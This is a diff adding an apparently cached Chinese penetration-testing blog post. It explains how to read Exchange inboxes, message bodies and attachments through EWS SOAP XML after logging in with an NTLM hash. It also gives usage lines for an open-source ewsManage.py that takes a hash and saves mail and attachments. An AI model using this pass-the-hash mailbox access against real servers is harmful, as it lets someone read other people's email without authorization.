@@ -1,0 +1,381 @@
+I"`F<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在之前的文章<a href="https://3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97">《Exchange Web Service(EWS)开发指南》</a>开源了工具<a href="https://github.com/3gstudent/ewsManage">ewsManage</a>，实现了对Exchange资源的访问。</p>
+
+<p>本文将要更近一步，通过SOAP XML message实现利用hash对Exchange资源的访问。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>利用hash访问Exchange资源的方法</li>
+  <li>SOAP XML message的使用</li>
+  <li>开源Python实现代码</li>
+  <li>代码开发细节</li>
+</ul>
+
+<h2 id="0x02-利用hash访问exchange资源的方法">0x02 利用hash访问Exchange资源的方法</h2>
+<hr />
+
+<p>在之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Exchange-Web-Service">《渗透技巧——Pass the Hash with Exchange Web Service》</a>介绍了使用hash登录ews的方法</p>
+
+<p>本文将要基于之前的研究，介绍登录ews以后访问Exchange资源的方法，所以在程序实现上会继续选择Python，使用EWS SOAP XML message访问Exchange的资源</p>
+
+<p>对于EWS SOAP XML message的格式，有以下两种方法进行参考：</p>
+
+<p>1.查找资料</p>
+
+<p>https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-client-applications</p>
+
+<p>https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-xml-elements-in-exchange</p>
+
+<p>2.抓包分析</p>
+
+<p>配置Wireshark，实现在Exchange Server上面捕获明文通信数据</p>
+
+<p>使用<a href="https://github.com/3gstudent/ewsManage">ewsManage</a>访问Exchange资源</p>
+
+<p>捕获通信数据，能够获得不同操作对应的EWS SOAP XML message格式，示例如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-5-20/2-1.png" alt="Alt text" /></p>
+
+<h2 id="0x03-soap-xml-message的使用">0x03 SOAP XML message的使用</h2>
+<hr />
+
+<p>相比于EWS Managed API，SOAP XML message更底层，需要考虑的细节也更多一些</p>
+
+<h3 id="1查看收件箱的邮件数量">1.查看收件箱的邮件数量</h3>
+
+<p>发送的XML格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
+               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
+               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Body&gt;
+    &lt;m:GetFolder&gt;
+      &lt;m:FolderShape&gt;
+        &lt;t:BaseShape&gt;Default&lt;/t:BaseShape&gt;
+      &lt;/m:FolderShape&gt;
+      &lt;m:FolderIds&gt;
+        &lt;t:DistinguishedFolderId Id="inbox"/&gt;
+      &lt;/m:FolderIds&gt;
+    &lt;/m:GetFolder&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre></div></div>
+
+<p>返回的内容格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+&lt;s:Header&gt;
+&lt;h:ServerVersionInfo xmlns:h="http://schemas.microsoft.com/exchange/services/2006/types" xmlns="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" MajorVersion="15" MinorVersion="0" MajorBuildNumber="847" MinorBuildNumber="31"/&gt;
+&lt;/s:Header&gt;
+&lt;s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
+&lt;m:GetFolderResponse xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"&gt;
+&lt;m:ResponseMessages&gt;
+&lt;m:GetFolderResponseMessage ResponseClass="Success"&gt;
+&lt;m:ResponseCode&gt;NoError&lt;/m:ResponseCode&gt;
+&lt;m:Folders&gt;
+&lt;t:Folder&gt;
+&lt;t:FolderId Id="AQAOAHRlc3QxQHRlc3QuY29tAC4AAAOeuRYNE6D6Q70cD0Q/s0RIAQAXa2D52NzfQYSx7xK5j92NAAACAQ0AAAA=" ChangeKey="AQAAABYAAAAXa2D52NzfQYSx7xK5j92NAAAAABK9"/&gt;
+&lt;t:DisplayName&gt;Inbox&lt;/t:DisplayName&gt;
+&lt;t:TotalCount&gt;6&lt;/t:TotalCount&gt;
+&lt;t:ChildFolderCount&gt;0&lt;/t:ChildFolderCount&gt;
+&lt;t:UnreadCount&gt;4&lt;/t:UnreadCount&gt;
+&lt;/t:Folder&gt;
+&lt;/m:Folders&gt;
+&lt;/m:GetFolderResponseMessage&gt;
+&lt;/m:ResponseMessages&gt;
+&lt;/m:GetFolderResponse&gt;
+&lt;/s:Body&gt;
+&lt;/s:Envelope&gt;
+</code></pre></div></div>
+
+<p>通过返回内容可以获得收件箱的邮件总数量，未读邮件数量</p>
+
+<h3 id="2获得收件箱邮件信息">2.获得收件箱邮件信息</h3>
+
+<p>发送的XML格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Header&gt;
+    &lt;t:RequestServerVersion Version="Exchange2013_SP1" /&gt;
+  &lt;/soap:Header&gt;
+  &lt;soap:Body&gt;
+    &lt;m:FindItem Traversal="Shallow"&gt;
+      &lt;m:ItemShape&gt;
+        &lt;t:BaseShape&gt;AllProperties&lt;/t:BaseShape&gt;
+        &lt;t:BodyType&gt;Text&lt;/t:BodyType&gt;
+      &lt;/m:ItemShape&gt;
+      &lt;m:IndexedPageItemView MaxEntriesReturned="2147483647" Offset="0" BasePoint="Beginning" /&gt;
+      &lt;m:ParentFolderIds&gt;
+        &lt;t:DistinguishedFolderId Id="inbox" /&gt;
+      &lt;/m:ParentFolderIds&gt;
+    &lt;/m:FindItem&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre></div></div>
+
+<p>通过返回内容可以获得收件箱所有邮件的标题、收发关系、是否带有附件等，但无法显示正文内容和附件名称</p>
+
+<p>通过返回内容能够获得每个邮件对应的ItemId和ChangeKey，进而获得邮件内容、附件的名称和Id</p>
+
+<h3 id="3获得指定邮件的具体内容">3.获得指定邮件的具体内容</h3>
+
+<p>发送的XML格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Header&gt;
+    &lt;t:RequestServerVersion Version="Exchange2013_SP1" /&gt;
+  &lt;/soap:Header&gt;
+  &lt;soap:Body&gt;
+    &lt;m:GetItem&gt;
+      &lt;m:ItemShape&gt;
+        &lt;t:BaseShape&gt;AllProperties&lt;/t:BaseShape&gt;
+        &lt;t:BodyType&gt;Text&lt;/t:BodyType&gt;
+      &lt;/m:ItemShape&gt;
+      &lt;m:ItemIds&gt;
+        &lt;t:ItemId Id="{id}" ChangeKey="{key}" /&gt;
+      &lt;/m:ItemIds&gt;
+    &lt;/m:GetItem&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre></div></div>
+
+<p>其中的<code class="language-plaintext highlighter-rouge">{id}</code>为指定邮件对应的ItemId，<code class="language-plaintext highlighter-rouge">{key}</code>为指定邮件对应的ChangeKey</p>
+
+<p>通过返回内容可以获得邮件的详细信息，包括正文内容</p>
+
+<h3 id="4获得指定邮件的附件名称">4.获得指定邮件的附件名称</h3>
+
+<p>发送的XML格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Header&gt;
+    &lt;t:RequestServerVersion Version="Exchange2013_SP1" /&gt;
+  &lt;/soap:Header&gt;
+  &lt;soap:Body&gt;
+    &lt;m:GetItem&gt;
+      &lt;m:ItemShape&gt;
+        &lt;t:BaseShape&gt;IdOnly&lt;/t:BaseShape&gt;
+        &lt;t:AdditionalProperties&gt;
+          &lt;t:FieldURI FieldURI="item:Attachments" /&gt;
+        &lt;/t:AdditionalProperties&gt;
+      &lt;/m:ItemShape&gt;
+      &lt;m:ItemIds&gt;
+        &lt;t:ItemId Id="{id}" /&gt;
+      &lt;/m:ItemIds&gt;
+    &lt;/m:GetItem&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre></div></div>
+
+<p>其中的<code class="language-plaintext highlighter-rouge">{id}</code>为指定邮件对应的ItemId</p>
+
+<p>返回的内容格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+&lt;s:Header&gt;
+&lt;h:ServerVersionInfo xmlns:h="http://schemas.microsoft.com/exchange/services/2006/types" xmlns="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" MajorVersion="15" MinorVersion="0" MajorBuildNumber="847" MinorBuildNumber="31" Version="V2_8"/&gt;
+&lt;/s:Header&gt;
+&lt;s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
+&lt;m:GetItemResponse xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"&gt;
+&lt;m:ResponseMessages&gt;
+&lt;m:GetItemResponseMessage ResponseClass="Success"&gt;
+&lt;m:ResponseCode&gt;NoError&lt;/m:ResponseCode&gt;
+&lt;m:Items&gt;
+&lt;t:Message&gt;
+&lt;t:ItemId Id="AAMkADc2OGUyODVmLWY3NjktNDY2MC1iMzllLTM4MThjYzU4OGQ4YgBGAAAAAACeuRYNE6D6Q70cD0Q/s0RIBwAXa2D52NzfQYSx7xK5j92NAAAAAAENAAAXa2D52NzfQYSx7xK5j92NAAAAAAztAAA=" ChangeKey="CQAAABYAAAAXa2D52NzfQYSx7xK5j92NAAAAAAzk"/&gt;
+&lt;t:Attachments&gt;
+&lt;t:FileAttachment&gt;
+&lt;t:AttachmentId Id="AAMkADc2OGUyODVmLWY3NjktNDY2MC1iMzllLTM4MThjYzU4OGQ4YgBGAAAAAACeuRYNE6D6Q70cD0Q/s0RIBwAXa2D52NzfQYSx7xK5j92NAAAAAAENAAAXa2D52NzfQYSx7xK5j92NAAAAAAztAAABEgAQAJwa7iI1b4ZGoFo6F/TfALM="/&gt;
+&lt;t:Name&gt;1.docx&lt;/t:Name&gt;
+&lt;t:Size&gt;3013&lt;/t:Size&gt;
+&lt;t:LastModifiedTime&gt;2020-05-21T01:17:07&lt;/t:LastModifiedTime&gt;
+&lt;t:IsInline&gt;false&lt;/t:IsInline&gt;
+&lt;t:IsContactPhoto&gt;false&lt;/t:IsContactPhoto&gt;
+&lt;/t:FileAttachment&gt;
+&lt;/t:Attachments&gt;
+&lt;t:HasAttachments&gt;true&lt;/t:HasAttachments&gt;
+&lt;/t:Message&gt;
+&lt;/m:Items&gt;
+&lt;/m:GetItemResponseMessage&gt;
+&lt;/m:ResponseMessages&gt;
+&lt;/m:GetItemResponse&gt;
+&lt;/s:Body&gt;
+&lt;/s:Envelope&gt;
+</code></pre></div></div>
+
+<p>通过返回内容可以获得附件的名称，但无法获得附件的内容</p>
+
+<p>通过返回内容能够获得每个附件对应的Id，进而获得附件的类型和内容</p>
+
+<h3 id="5获得指定附件的内容">5.获得指定附件的内容</h3>
+
+<p>发送的XML格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Header&gt;
+    &lt;t:RequestServerVersion Version="Exchange2013_SP1" /&gt;
+  &lt;/soap:Header&gt;
+  &lt;soap:Body&gt;
+    &lt;m:GetAttachment&gt;
+      &lt;m:AttachmentIds&gt;
+        &lt;t:AttachmentId Id="{id}" /&gt;
+      &lt;/m:AttachmentIds&gt;
+    &lt;/m:GetAttachment&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre></div></div>
+
+<p>其中的<code class="language-plaintext highlighter-rouge">{id}</code>为指定附件对应的Id</p>
+
+<p>返回的内容格式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+&lt;s:Header&gt;
+&lt;h:ServerVersionInfo xmlns:h="http://schemas.microsoft.com/exchange/services/2006/types" xmlns="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" MajorVersion="15" MinorVersion="0" MajorBuildNumber="847" MinorBuildNumber="31" Version="V2_8"/&gt;
+&lt;/s:Header&gt;
+&lt;s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
+&lt;m:GetAttachmentResponse xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"&gt;
+&lt;m:ResponseMessages&gt;
+&lt;m:GetAttachmentResponseMessage ResponseClass="Success"&gt;
+&lt;m:ResponseCode&gt;NoError&lt;/m:ResponseCode&gt;
+&lt;m:Attachments&gt;
+&lt;t:FileAttachment&gt;
+&lt;t:AttachmentId Id="AAMkADc2OGUyODVmLWY3NjktNDY2MC1iMzllLTM4MThjYzU4OGQ4YgBGAAAAAACeuRYNE6D6Q70cD0Q/s0RIBwAXa2D52NzfQYSx7xK5j92NAAAAAAENAAAXa2D52NzfQYSx7xK5j92NAAAAAAzvAAABEgAQAK2JBdCt/lxColLkCuqo5hw="/&gt;
+&lt;t:Name&gt;1.txt&lt;/t:Name&gt;
+&lt;t:ContentType&gt;text/plain&lt;/t:ContentType&gt;
+&lt;t:Content&gt;{xxxxxxx}&lt;/t:Content&gt;
+&lt;/t:FileAttachment&gt;
+&lt;/m:Attachments&gt;
+&lt;/m:GetAttachmentResponseMessage&gt;
+&lt;/m:ResponseMessages&gt;
+&lt;/m:GetAttachmentResponse&gt;
+&lt;/s:Body&gt;
+&lt;/s:Envelope&gt;
+</code></pre></div></div>
+
+<p>其中的<code class="language-plaintext highlighter-rouge">{xxxxxxx}</code>为base64编码后的内容，解码后可获得附件的内容</p>
+
+<p>这是需要注意附件的类型，如果为text，表示文本类型，否则在保存附件时需要以二进制格式写入</p>
+
+<h2 id="0x04-开源python实现代码">0x04 开源Python实现代码</h2>
+<hr />
+
+<p>代码已开源，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py</p>
+
+<p>使用Python实现，脚本运行前需要安装Impacket</p>
+
+<p>安装方法： <code class="language-plaintext highlighter-rouge">pip install Impacket</code></p>
+
+<p>分别支持对明文和ntlm hash的登录</p>
+
+<p>在功能上基本上和<a href="https://github.com/3gstudent/ewsManage">ewsManage</a>保持一致</p>
+
+<p>支持以下功能：</p>
+
+<ul>
+  <li>查看收件箱邮件数量</li>
+  <li>查看发件箱邮件数量</li>
+  <li>查看收件箱邮件信息</li>
+  <li>查看发件箱邮件信息</li>
+  <li>查看指定邮件的具体信息</li>
+  <li>查看指定附件的信息</li>
+  <li>保存指定附件</li>
+</ul>
+
+<p>用法示例：</p>
+
+<p>(1)查看收件箱邮件数量(使用明文登录)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 getfolderofinbox
+</code></pre></div></div>
+
+<p>(2)查看收件箱中的邮件信息(使用hash登录)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.py 192.168.1.1 443 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1 listmailofinbox
+</code></pre></div></div>
+
+<p>(3)查看指定邮件的具体信息</p>
+
+<p>查看收件箱中的邮件信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 listmailofinbox
+</code></pre></div></div>
+
+<p>结果保存为listmailofinbox.xml，从文件中获得对应邮件的ItemId和ChangeKey</p>
+
+<p>查看指定邮件的具体信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 getmail
+</code></pre></div></div>
+
+<p>接着输入邮件的ItemId和ChangeKey</p>
+
+<p>最终结果保存为getmail.xml</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-5-20/3-1.png" alt="Alt text" /></p>
+
+<p>(4)保存指定附件</p>
+
+<p>查看收件箱中的邮件信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 listmailofinbox
+</code></pre></div></div>
+
+<p>结果保存为listmailofinbox.xml，从中获得对应邮件的ItemId</p>
+
+<p>查看指定附件的信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 getattachment
+</code></pre></div></div>
+
+<p>接着输入邮件的ItemId</p>
+
+<p>命令行输出附件名称</p>
+
+<p>结果保存为getattachment.xml，从文件中获得对应附件的Id</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-5-20/3-2.png" alt="Alt text" /></p>
+
+<p>保存指定邮件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ewsManage.py 192.168.1.1 443 plaintext test.com user1 password1 saveattachment
+</code></pre></div></div>
+
+<p>接着输入附件的Id</p>
+
+<p>自动保存附件，区分是否为text格式</p>
+
+<p>结果保存为saveattachment.xml</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-5-20/3-3.png" alt="Alt text" /></p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了SOAP XML message的使用，开源代码<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py">ewsManage.py</a>，实现了利用hash对Exchange资源的访问</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
